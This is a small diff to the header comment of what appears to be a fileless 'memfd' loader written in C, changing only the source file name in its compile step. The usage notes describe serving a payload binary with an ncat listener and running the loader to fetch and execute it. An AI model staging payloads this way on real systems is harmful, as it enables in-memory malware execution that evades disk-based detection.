@@ -17,7 +17,7 @@
  *
  *  Typical Use:
  *    1. Compile the loader:
- *         $  gcc -o loader memfd-loader.c
+ *         $  gcc -o loader loader.c
  *    2. Start a listener to serve the payload binary:
  *         $ ncat -lvnp 1111 < payload.elf
  *    3. Execute the loader:
